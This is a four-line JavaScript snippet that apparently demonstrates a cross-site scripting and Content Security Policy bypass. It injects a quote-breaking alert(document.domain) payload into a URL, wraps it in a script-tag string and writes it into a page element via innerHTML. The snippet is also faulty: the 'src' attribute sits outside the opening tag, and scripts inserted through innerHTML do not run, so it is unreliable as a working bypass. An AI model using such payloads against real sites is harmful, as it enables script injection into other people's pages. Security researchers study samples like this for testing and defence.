var jsLocation = "https://someurl_on_the_website.com/7hello'-alert(document.domain)-'";
var cspBypass = `<script> src="${jsLocation}"></script>`;
var reason = document.getElementById("reason");
reason.innerHTML = cspBypass;
